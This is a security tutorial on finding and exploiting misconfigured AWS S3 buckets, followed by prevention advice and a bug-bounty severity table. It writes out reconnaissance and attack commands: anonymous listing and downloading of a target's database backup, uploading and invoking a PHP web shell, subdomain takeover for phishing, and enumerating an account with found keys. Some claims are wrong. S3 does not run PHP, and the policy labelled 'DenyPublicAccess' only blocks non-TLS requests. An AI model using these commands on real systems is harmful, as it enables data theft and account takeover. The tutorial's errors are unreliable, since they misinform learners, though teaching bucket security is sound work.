# AWS S3 Buckets — 

---

## What is AWS S3?

**Amazon Simple Storage Service (S3)** is a cloud object storage service provided by Amazon Web Services (AWS). It allows individuals and organizations to store and retrieve any amount of data from anywhere on the internet.

```
Your Computer                    Amazon AWS Cloud
     │                                  │
     │  ──── Upload File ─────────────▶ │
     │                                  │  ┌─────────────────┐
     │                                  │  │   S3 Bucket     │
     │                                  │  │  ┌───────────┐  │
     │                                  │  │  │ file.pdf  │  │
     │  ◀──── Download File ─────────── │  │  │ image.png │  │
     │                                  │  │  │ index.html│  │
     │                                  │  └─────────────────┘
```

---

## S3 Core Concepts

### Buckets
A **bucket** is a container for storing objects (files). Think of it like a folder in the cloud.

```
Bucket name:  company-assets
Region:       us-east-1
URL format:   https://company-assets.s3.amazonaws.com
              https://s3.amazonaws.com/company-assets
              https://company-assets.s3.us-east-1.amazonaws.com
```

### Objects
Everything stored inside a bucket is an **object**:
```
https://company-assets.s3.amazonaws.com/images/logo.png
https://company-assets.s3.amazonaws.com/documents/report.pdf
https://company-assets.s3.amazonaws.com/backup/database.sql  ← dangerous!
```

### Regions
Buckets are hosted in specific AWS regions:
```
us-east-1       → US East (N. Virginia)
us-west-2       → US West (Oregon)
eu-west-1       → Europe (Ireland)
ap-southeast-1  → Asia Pacific (Singapore)
```

---

## S3 URL Formats

There are multiple URL formats for accessing S3 buckets:

```
# Virtual-hosted-style (most common)
https://{bucket-name}.s3.amazonaws.com/{key}
https://{bucket-name}.s3.{region}.amazonaws.com/{key}

# Path-style (older format)
https://s3.amazonaws.com/{bucket-name}/{key}
https://s3.{region}.amazonaws.com/{bucket-name}/{key}

# Custom domain (via CNAME)
https://assets.example.com/{key}  ← bucket configured as custom domain

# Examples:
https://tryhackme-assets.s3.amazonaws.com/logo.png
https://my-company.s3.us-east-1.amazonaws.com/files/data.csv
https://s3.amazonaws.com/my-company/files/data.csv
```

---

## S3 Access Control & Permissions

### Permission Levels

```
BUCKET LEVEL:
├── Private (default)     → Only owner can access
├── Public Read           → Anyone can download files
├── Public Read/Write     → Anyone can download AND upload!
└── Authenticated Users   → Any AWS account holder

OBJECT LEVEL:
├── Private               → Only bucket owner
├── Public Read           → Anyone can read this specific file
└── Custom ACL            → Fine-grained permissions
```

### ACL (Access Control List) Types
```json
// Private — safe
{
  "Permission": "FULL_CONTROL",
  "Grantee": "owner-only"
}

// Public Read — risky
{
  "Permission": "READ",
  "Grantee": "http://acs.amazonaws.com/groups/global/AllUsers"
}

// Public Read/Write — CRITICAL vulnerability!
{
  "Permission": "WRITE",
  "Grantee": "http://acs.amazonaws.com/groups/global/AllUsers"
}
```

---

## Why S3 Buckets Get Misconfigured

### Common Mistakes:
```
1. Developer sets bucket to public for testing → forgets to revert
2. Misconfigured bucket policy grants too many permissions
3. Wildcard (*) used in bucket policy accidentally
4. Third-party services given excessive permissions
5. Automated deployments with wrong permission settings
6. Legacy buckets created before security was prioritized
```

### Real-World Breaches Caused by S3 Misconfigurations:
```
- Verizon (2017)     → 14 million customer records exposed
- WWE (2017)         → 3 million fan records exposed
- GoDaddy (2018)     → Infrastructure data leaked
- Capital One (2019) → 100 million customers affected
- Twitch (2021)      → Source code and earnings data leaked
- Samsung (2023)     → Internal source code exposed
```

---

## Finding S3 Buckets — Reconnaissance Techniques

### Method 1 — Website Source Code
```bash
# View page source and search for amazonaws.com
curl -s https://target.com | grep -i "amazonaws\|s3\|bucket"

# Common patterns in source code:
src="https://company-assets.s3.amazonaws.com/image.jpg"
href="https://company-docs.s3.amazonaws.com/guide.pdf"
action="https://uploads.s3.amazonaws.com/"
```

### Method 2 — Common Naming Patterns
```bash
# Companies often name buckets predictably:
{company}-assets
{company}-www
{company}-public
{company}-private
{company}-backup
{company}-dev
{company}-staging
{company}-prod
{company}-data
{company}-media
{company}-uploads
{company}-static
{company}-files
{company}-logs
{company}-images
{company}-documents
{company}-database
{company}-config
```

### Method 3 — Google Dorking
```
# Google dorks for finding exposed S3 buckets:
site:s3.amazonaws.com "company-name"
site:s3.amazonaws.com inurl:backup
site:s3.amazonaws.com filetype:sql
site:s3.amazonaws.com filetype:env
site:s3.amazonaws.com "confidential"
site:s3.amazonaws.com "internal use only"
```

### Method 4 — GitHub & Code Repositories
```bash
# Search GitHub for hardcoded S3 references:
# https://github.com/search?q=company+s3.amazonaws.com

# Common patterns in code:
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG
S3_BUCKET=my-company-private-data
```

### Method 5 — DNS & SSL Certificates
```bash
# Check certificate transparency logs
# https://crt.sh/?q=%.s3.amazonaws.com

# Check for CNAME pointing to S3
dig CNAME assets.target.com
# assets.target.com → company-bucket.s3.amazonaws.com
```

### Method 6 — Automated Tools
```bash
# S3Scanner — scans for open buckets
pip install s3scanner
s3scanner scan --bucket company-name
s3scanner scan --bucket-file buckets.txt

# GrayhatWarfare — online search engine for public buckets
# https://buckets.grayhatwarfare.com/

# Lazys3 — brute forces bucket names
python lazys3.py company-name

# Bucket Finder
./bucket_finder.rb company-name

# AWS CLI — if you find credentials
aws s3 ls s3://bucket-name --no-sign-request

# Slurp
slurp domain -t target.com
```

---

## Testing S3 Bucket Permissions

### Using AWS CLI
```bash
# Test anonymous (unauthenticated) access — no credentials needed
aws s3 ls s3://target-bucket --no-sign-request

# List all objects in bucket
aws s3 ls s3://target-bucket --no-sign-request --recursive

# Download a file anonymously
aws s3 cp s3://target-bucket/file.txt . --no-sign-request

# Try uploading (write access test)
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/ --no-sign-request

# Try deleting (delete access test — NEVER do on real targets!)
aws s3 rm s3://target-bucket/test.txt --no-sign-request

# Get bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Get bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
```

### Using curl
```bash
# Check if bucket exists and is public
curl -I https://target-bucket.s3.amazonaws.com/

# List bucket contents (if public)
curl https://target-bucket.s3.amazonaws.com/

# Download specific file
curl https://target-bucket.s3.amazonaws.com/backup.sql -o backup.sql

# Try PUT (upload) — write access test
curl -X PUT https://target-bucket.s3.amazonaws.com/test.txt \
  -d "test content"
```

### Understanding Responses
```xml
<!-- Bucket exists but access denied — private bucket -->
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied</Message>
</Error>

<!-- Bucket doesn't exist -->
<Error>
  <Code>NoSuchBucket</Code>
  <Message>The specified bucket does not exist</Message>
</Error>

<!-- SUCCESS! Public bucket listing -->
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult>
  <Name>target-bucket</Name>
  <Contents>
    <Key>backup/database.sql</Key>    ← found sensitive file!
    <Key>config/.env</Key>            ← environment file!
    <Key>users/export.csv</Key>       ← user data!
  </Contents>
</ListBucketResult>
```

---

## Sensitive Files to Look For

Once you have read access, search for:
```bash
# Databases
*.sql, *.db, *.sqlite, *.dump, *.backup

# Configuration files
.env, config.php, config.yml, settings.py
database.yml, wp-config.php, .htpasswd

# Credentials
credentials.json, secrets.txt, passwords.txt
*.pem, *.key, id_rsa, *.pfx

# Source code
*.zip, *.tar.gz, *.tar containing source

# Data exports
*.csv, *.json, *.xml containing user data

# Logs
*.log files containing sensitive info

# AWS credentials
credentials, .aws/credentials
```

---

## Real Attack Scenarios

### Scenario 1 — Read Access (Data Breach)
```bash
# 1. Find bucket
aws s3 ls s3://company-backups --no-sign-request

# 2. Find sensitive file
2024-01-15  database_backup.sql

# 3. Download it
aws s3 cp s3://company-backups/database_backup.sql . --no-sign-request

# 4. Access millions of user records
mysql -u root -p < database_backup.sql
SELECT * FROM users;
# 5,000,000 rows returned → CRITICAL breach!
```

### Scenario 2 — Write Access (Web Shell Upload)
```bash
# 1. Confirm write access
aws s3 cp shell.php s3://company-website/ --no-sign-request

# 2. Access the shell
curl https://company-website.s3.amazonaws.com/shell.php?cmd=whoami

# 3. Achieved Remote Code Execution!
```

### Scenario 3 — Subdomain Takeover via S3
```bash
# 1. Find CNAME pointing to deleted S3 bucket
dig CNAME assets.target.com
# assets.target.com → deleted-bucket.s3.amazonaws.com

# 2. Create new bucket with same name
aws s3 mb s3://deleted-bucket

# 3. Host malicious content
# Any visitor to assets.target.com now gets YOUR content!
# Can be used for phishing, XSS, credential harvesting
```

---

## AWS Credential Exposure

Sometimes S3 buckets contain AWS credentials themselves:
```bash
# If you find AWS keys:
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Configure them
aws configure
# Enter the found keys

# Check what you have access to
aws sts get-caller-identity
aws s3 ls                          # list all buckets
aws iam get-user                   # get user info
aws iam list-attached-user-policies # check permissions

# This could lead to full AWS account takeover!
```

---

## Prevention & Secure Configuration

### 1. Block All Public Access (AWS Console)
```
S3 → Bucket → Permissions → Block Public Access
☑ Block all public access
☑ Block public ACLs
☑ Block public bucket policies
☑ Block cross-account access
```

### 2. Secure Bucket Policy
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicAccess",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
```

### 3. Enable Encryption
```bash
# Enable default encryption
aws s3api put-bucket-encryption \
  --bucket my-bucket \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "AES256"
      }
    }]
  }'
```

### 4. Enable Logging & Monitoring
```bash
# Enable access logging
aws s3api put-bucket-logging \
  --bucket my-bucket \
  --bucket-logging-status '{
    "LoggingEnabled": {
      "TargetBucket": "my-logs-bucket",
      "TargetPrefix": "access-logs/"
    }
  }'

# Enable CloudTrail for API calls
# Enable GuardDuty for threat detection
# Set up S3 alerts in CloudWatch
```

### 5. Use Pre-signed URLs for Sharing
```python
import boto3

s3 = boto3.client('s3')

# Generate temporary URL (expires in 1 hour)
url = s3.generate_presigned_url(
    'get_object',
    Params={'Bucket': 'my-bucket', 'Key': 'secret-file.pdf'},
    ExpiresIn=3600  # 1 hour only
)
# Share this URL instead of making bucket public
```

---

## Security Checklist

```
DISCOVERY PREVENTION:
☐ Use non-guessable bucket names (add random suffix)
☐ Don't reference bucket URLs in public source code
☐ Remove S3 references from GitHub repositories
☐ Monitor certificate transparency for your bucket names

ACCESS CONTROL:
☐ Enable "Block All Public Access" by default
☐ Review bucket policies regularly
☐ Use IAM roles instead of access keys
☐ Apply least privilege to all IAM permissions
☐ Rotate AWS access keys regularly

DATA PROTECTION:
☐ Enable server-side encryption (AES-256 or KMS)
☐ Enable versioning for important buckets
☐ Enable MFA Delete for critical buckets
☐ Use VPC endpoints for internal access

MONITORING:
☐ Enable S3 server access logging
☐ Enable CloudTrail for API activity
☐ Set up GuardDuty for threat detection
☐ Create CloudWatch alerts for unusual access
☐ Regularly audit with AWS Trusted Advisor
```

---

## Bug Bounty Severity Guide

| Finding | Severity | Payout Range |
|---|---|---|
| Public bucket — no sensitive data | Low 🟡 | $50–$300 |
| Public bucket — internal files | Medium 🟠 | $300–$1,000 |
| Public bucket — PII/user data | High 🟠 | $1,000–$10,000 |
| Public bucket — credentials/keys | Critical 🔴 | $5,000–$50,000 |
| Write access to production bucket | Critical 🔴 | $5,000–$50,000 |
| AWS key leading to account takeover | Critical 🔴 | $10,000–$100,000+ |
| Subdomain takeover via S3 | High 🟠 | $1,000–$5,000 |

---

## Key Takeaway

> An exposed S3 bucket is like leaving your **filing cabinet unlocked on the street**. It may contain nothing important, or it may contain your entire company's data, source code, and credentials. Always apply the principle of **least privilege**, block public access by default, and regularly audit your buckets. One misconfigured S3 bucket has caused some of the **largest data breaches in history**! 🛡️
